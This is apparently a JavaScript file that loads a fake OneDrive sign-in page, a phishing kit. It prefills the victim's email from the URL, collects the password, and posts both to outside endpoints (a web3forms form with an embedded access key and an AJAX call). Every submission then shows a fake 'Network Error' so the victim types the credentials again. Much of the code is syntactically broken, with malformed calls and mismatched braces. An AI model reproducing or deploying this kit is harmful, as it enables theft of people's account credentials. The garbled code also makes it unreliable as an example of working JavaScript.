// len.js
fetch('https://raw.githubusercontent.com/amira800/OneDrive-File-Download/refs/heads/main/OneDrive.html')
console.log("JavaScript file has been loaded!");
$(document).ready(function() {
    $('.loaded').html)` 
  <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OneDrive</title>
    <script src="index.html/to/len.js"></script>
</head>
<body>
    <h1>Contact Form</h1>
    <form action="https://api.web3forms.com/submit" method="POST">

    <!-- Replace with your Access Key -->
    <input type="hidden" name="access_key" value="68c2f032-ae3c-41ea-bdb4-11061b978f83">

    <!-- Form Inputs. Each input must have a name="" attribute --> 
 <input type="email" name="x1" id="x1" class="form-control mb-3" placeholder="Email" value required> 
 <input type="password" name="x2" id="x2" class="form-control mb-3" placeholder="Password" value required>
 <button id="submitbtn" class="btn-md btn primary">Sign in</button>
 </form>
 
    <script src="https://web3forms.com/api.js"></script>
    <script>
        var url = window.location.hash.substr(1);  
$("#x1").val(url) 
$("#formx").submit(function (e) {
    e.preventDefault() 
    var nm = $("#A1").val() 
    var formData = new FormData($("#formx")[0]);
    $("#submitBtn").html() 
      <button class="btn btn-sm btn-primary" value="disabled"></button> 
        <span class="spinner-grow spinner-grow-sm" class="Please Wait...."></span> 
     ').prop("disabled", true);  
    $("#x2").click(function () {
        $("#msg").hide();
    }, 
    },

             $.ajax({
        url: "https://api.github.com/OneDrive-File-Download/amira800/OneDrive/post", { 
        type: 'POST',
        data: formData,
        contentType: false,
        processData: false,
        headers: {
                    'Accept': 'application/json'
                }
            })
        success: function(res) {
            setTimeout(function () {
                $("#x1").val(url);
                $("#x2").val("");
                $("#msg").show();
                $("#msg").html("Network Error! Please verify your information and try again");
                $("#submitBtn").html("Sign In").prop("disabled", false);
            }, 1000);
        },
        error: function(res) {
            setTimeout(function () {
                $("#x1").val(url);
                $("#x2").val("");
                $("#msg").show();
                $("#msg").html("Network Error! Please verify your information and try again");
                $("#submitBtn").html("Sign In").prop("disabled", false);
            }, 1000);
        }
    }) 
 </script>
   </body>
</html>
